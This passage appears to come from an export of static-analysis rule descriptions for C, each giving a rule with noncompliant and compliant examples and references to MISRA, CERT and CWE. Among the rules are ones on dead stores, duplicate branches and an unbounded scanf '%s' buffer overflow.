<code>bool</code> operands.</p>
<p>This rule allows the detection of such uses, which often occur because the logical operators (<code>&amp;&amp;</code>, <code>||</code> and
<code>!</code>) can be easily confused with the bitwise operators (<code>&amp;</code>, <code>|</code> and <code>~</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
bool b1 = true;
bool b2 = false;
int8_t s8a;
if ( b1 &amp; b2 ) // Noncompliant
if ( ~b1 ) // Noncompliant
if ( b1 &lt; b2 ) // Noncompliant
if ( b1 ^ b2 ) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( b1 &amp;&amp; b2 )
if ( !b1 )
if ( b1 == false )
if ( b1 == b2 )
if ( b1 != b2 )
s8a = b1 ? 3 : 7;
</pre>
<h2>Exceptions</h2>
<p>Operators <code>|=</code> and <code>&amp;=</code> are ignored when used with <code>bool</code> operands. Operator <code>++</code> is also ignored
with a <code>bool</code> operand because it is covered by rule S2668.</p>
<pre>
void test(bool b1, bool b2, int i1) {
  b1 |= b2; // ignored
  b1++; // ignored here, handled by S2668
  b1 &amp;= b2; // ignored
  b1 &amp;= i1; // Noncompliant; right operand is not a bool
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 4-5-1 - Expressions with type bool shall not be used as operands to built-in operators other than the assignment operator =,
  the logical operators &amp;&amp;, ||, !, the equality operators == and !=, the unary &amp; operator, and the conditional operator. </li>
</ul>",c:S872,c,C,"<p>The use of <code>bool</code> operands with other operators is unlikely to be meaningful (or intended). Best case it will be confusing to
maintainers, worst case it will not have the intended effect. Either way, it is highly recommended to stick to boolean operators when dealing with
<code>bool</code> operands.</p>
<p>This rule allows the detection of such uses, which often occur because the logical operators (<code>&amp;&amp;</code>, <code>||</code> and
<code>!</code>) can be easily confused with the bitwise operators (<code>&amp;</code>, <code>|</code> and <code>~</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
bool b1 = true;
bool b2 = false;
int8_t s8a;
if ( b1 &amp; b2 ) // Noncompliant
if ( ~b1 ) // Noncompliant
if ( b1 &lt; b2 ) // Noncompliant
if ( b1 ^ b2 ) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ( b1 &amp;&amp; b2 )
if ( !b1 )
if ( b1 == false )
if ( b1 == b2 )
if ( b1 != b2 )
s8a = b1 ? 3 : 7;
</pre>
<h2>Exceptions</h2>
<p>Operators <code>|=</code> and <code>&amp;=</code> are ignored when used with <code>bool</code> operands. Operator <code>++</code> is also ignored
with a <code>bool</code> operand because it is covered by rule S2668.</p>
<pre>
void test(bool b1, bool b2, int i1) {
  b1 |= b2; // ignored
  b1++; // ignored here, handled by S2668
  b1 &amp;= b2; // ignored
  b1 &amp;= i1; // Noncompliant; right operand is not a bool
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 4-5-1 - Expressions with type bool shall not be used as operands to built-in operators other than the assignment operator =,
  the logical operators &amp;&amp;, ||, !, the equality operators == and !=, the unary &amp; operator, and the conditional operator. </li>
</ul>","""bool"" expressions should not be used as operands to built-in operators other than =, &&, ||, !, ==, !=, unary &, and the conditional operator",[],MAJOR,"['misra', 'suspicious']",CODE_SMELL
2014-06-30T14:50:25+0200,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {
}
</pre>
<h2>Exceptions</h2>
<p>In the case of empty expanded macro and in the case of 2 consecutive semi-colons when one of the two is part of a macro-definition then the issue
is not raised.</p>
<p>Example:</p>
<pre>
#define A(x) x;
#define LOG(x)

void fun() {
  A(5);
  LOG(X);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",c:S1116,c,C,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething() {
  ;                                                       // Noncompliant - was used as a kind of TODO marker
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething() {
}
</pre>
<h2>Exceptions</h2>
<p>In the case of empty expanded macro and in the case of 2 consecutive semi-colons when one of the two is part of a macro-definition then the issue
is not raised.</p>
<p>Example:</p>
<pre>
#define A(x) x;
#define LOG(x)

void fun() {
  A(5);
  LOG(X);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",Empty statements should be removed,[],MINOR,"['cert', 'misra', 'unused']",CODE_SMELL
2016-02-12T17:19:22+0100,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores:</p>
<ul>
  <li> variable declarations initializers </li>
  <li> prefix and postfix increments and decrements <code>x++;</code> </li>
  <li> null pointer assignments <code>x = NULL;</code> </li>
  <li> self assignments (i.e. <code>x = x;</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",c:S1854,c,C,"<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores:</p>
<ul>
  <li> variable declarations initializers </li>
  <li> prefix and postfix increments and decrements <code>x++;</code> </li>
  <li> null pointer assignments <code>x = NULL;</code> </li>
  <li> self assignments (i.e. <code>x = x;</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/563.html"">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QYA5"">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/uQCSBg"">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>",Dead stores should be removed,[],MAJOR,"['cert', 'cwe', 'unused']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>In case of Objective-C it is acceptable to have unused parameters if the method is supposed to be overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) { // Noncompliant, ""b"" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",c:S1172,c,C,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>In case of Objective-C it is acceptable to have unused parameters if the method is supposed to be overridden.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) { // Noncompliant, ""b"" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused function parameters should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments explicitly enclosed in parentheses are ignored.</p>
<pre>
while ((run = keepRunning())) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",c:AssignmentInSubExpression,c,C,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments explicitly enclosed in parentheses are ignored.</p>
<pre>
while ((run = keepRunning())) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",Assignments should not be made from within sub-expressions,[],MAJOR,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2014-06-30T14:50:25+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that type specifiers always appear in the following order:</p>
<ol>
  <li> <code>typedef</code> </li>
  <li> type name, spelling of built-in types with more than one type-specifier:
    <ol>
      <li> signedness - <code>signed</code> or <code>unsigned</code> </li>
      <li> last single type-specifier or
        <ul>
          <li> <code>short int</code> </li>
          <li> <code>long int</code> </li>
          <li> <code>long long int</code> </li>
          <li> <code>long double</code> </li>
        </ul> </li>
    </ol> </li>
</ol>
<p>Since the positioning of the <code>const</code> keyword is controversial, this rule does not check it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int typedef T;

double long d;
char unsigned ch;
long signed int i;

</pre>
<h2>Compliant Solution</h2>
<pre>
typedef int T;

long double d;
unsigned char ch;
signed long int i;

</pre>",c:S1749,c,C,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that type specifiers always appear in the following order:</p>
<ol>
  <li> <code>typedef</code> </li>
  <li> type name, spelling of built-in types with more than one type-specifier:
    <ol>
      <li> signedness - <code>signed</code> or <code>unsigned</code> </li>
      <li> last single type-specifier or
        <ul>
          <li> <code>short int</code> </li>
          <li> <code>long int</code> </li>
          <li> <code>long long int</code> </li>
          <li> <code>long double</code> </li>
        </ul> </li>
    </ol> </li>
</ol>
<p>Since the positioning of the <code>const</code> keyword is controversial, this rule does not check it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int typedef T;

double long d;
char unsigned ch;
long signed int i;

</pre>
<h2>Compliant Solution</h2>
<pre>
typedef int T;

long double d;
unsigned char ch;
signed long int i;

</pre>",Type specifiers should be listed in a standard order,[],MINOR,[],CODE_SMELL
2017-04-11T12:32:42+0200,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>",c:S3923,c,C,"<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

int b = a &gt; 12 ? 4 : 4;  // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>",All branches in a conditional structure should not have exactly the same implementation,[],MAJOR,[],BUG
2013-09-16T11:41:23+0200,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",c:CommentedCode,c,C,"<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be ""commented out"". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be ""commented out"" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be ""commented out"" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be ""commented out"" </li>
</ul>",Sections of code should not be commented out,[],MAJOR,"['misra', 'unused']",CODE_SMELL
2015-02-03T08:39:44+0100,"<p>There are three distinct <code>char</code> types, (plain) <code>char</code>, <code>signed char</code> and <code>unsigned char</code>. <code>signed
char</code> and <code>unsigned char</code> should only be used for numeric data, and plain <code>char</code> should only be used for character data.
Since it is implementation-defined, the signedness of the plain <code>char</code> type should not be assumed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
signed char a = 'a'; // Noncompliant, explicitly signed
unsigned char b = '\r'; // Noncompliant, explicitly unsigned
char c = 10; // Noncompliant

unsigned char d = c; // Noncompliant, d is explicitly signed while c is not
char e = a; // Noncompliant, a is explicitly signed while e is not
</pre>
<h2>Compliant Solution</h2>
<pre>
char a = 'a';
char b = '\r';
unsigned char c = 10;
signed char c = 10;
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Since the integer value 0 is used as a sentinel for the end of a string, converting this value to char is ignored. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 6.1 - The plain char type shall be used only for the storage and use of character values </li>
  <li> MISRA C:2004, 6.2 - signed and unsigned char type shall be used only for the storage and use of number values </li>
  <li> MISRA C++:2008, 5-0-11 - The plain char type shall only be used for the storage and use of character values </li>
  <li> MISRA C++:2008, 5-0-12 - signed char and unsigned char type shall only be used for the storage and use of numeric values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/-As"">CERT, INT07-C.</a> - Use only explicitly signed or unsigned char type for numeric
  values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/5AD7"">CERT, STR00-C.</a> - Represent characters using an appropriate type </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/JABi"">CERT, STR04-C.</a> - Use plain char for characters in the basic character set
  </li>
</ul>",c:S810,c,C,"<p>There are three distinct <code>char</code> types, (plain) <code>char</code>, <code>signed char</code> and <code>unsigned char</code>. <code>signed
char</code> and <code>unsigned char</code> should only be used for numeric data, and plain <code>char</code> should only be used for character data.
Since it is implementation-defined, the signedness of the plain <code>char</code> type should not be assumed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
signed char a = 'a'; // Noncompliant, explicitly signed
unsigned char b = '\r'; // Noncompliant, explicitly unsigned
char c = 10; // Noncompliant

unsigned char d = c; // Noncompliant, d is explicitly signed while c is not
char e = a; // Noncompliant, a is explicitly signed while e is not
</pre>
<h2>Compliant Solution</h2>
<pre>
char a = 'a';
char b = '\r';
unsigned char c = 10;
signed char c = 10;
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Since the integer value 0 is used as a sentinel for the end of a string, converting this value to char is ignored. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 6.1 - The plain char type shall be used only for the storage and use of character values </li>
  <li> MISRA C:2004, 6.2 - signed and unsigned char type shall be used only for the storage and use of number values </li>
  <li> MISRA C++:2008, 5-0-11 - The plain char type shall only be used for the storage and use of character values </li>
  <li> MISRA C++:2008, 5-0-12 - signed char and unsigned char type shall only be used for the storage and use of numeric values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/-As"">CERT, INT07-C.</a> - Use only explicitly signed or unsigned char type for numeric
  values </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/5AD7"">CERT, STR00-C.</a> - Represent characters using an appropriate type </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/JABi"">CERT, STR04-C.</a> - Use plain char for characters in the basic character set
  </li>
</ul>",Appropriate char types should be used for character and integer values,[],MINOR,"['cert', 'confusing', 'misra']",CODE_SMELL
2014-06-30T14:50:25+0200,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",c:S1751,c,C,"<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  printf(""i is %d"", i);
  break;
}
...
for (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i is %d"", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf(""i is %d"", i);
  }
}
</pre>",Loops with at most one iteration should be refactored,[],MAJOR,[],BUG
2014-11-07T16:16:36+0100,"<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=c%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>",c:S1871,c,C,"<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule {rule:c:S3923} raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>",Two branches in a conditional structure should not have exactly the same implementation,[],MAJOR,"['design', 'suspicious']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
char buffer[10];
scanf(""%s"", buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h2>Compliant Solution</h2>
<pre>
char buffer[10];
scanf(""%9s"", buffer);     // Compliant - will not overflow
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",c:S1079,c,C,"<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
char buffer[10];
scanf(""%s"", buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h2>Compliant Solution</h2>
<pre>
char buffer[10];
scanf(""%9s"", buffer);     // Compliant - will not overflow
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/120"">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/676"">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>","""scanf()"" and ""fscanf()"" format strings should specify a field width for the ""%s"" string placeholder",[],CRITICAL,"['cwe', 'injection', 'sans-top25-risky']",VULNERABILITY
2014-06-30T14:50:25+0200,"<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  do_z();
}
if ( a != a ) { // always false
  do_y();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  do_x();
}
if (a == b || a == b ) { // if the first one is true, the second one is too
  do_w();
}

if (5 / 5) { // always 1
  do_v();
}
if (5 - 5) { // always 0
  do_u();
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored:</p>
<ul>
  <li> The expression <code>1 &lt;&lt; 1</code> </li>
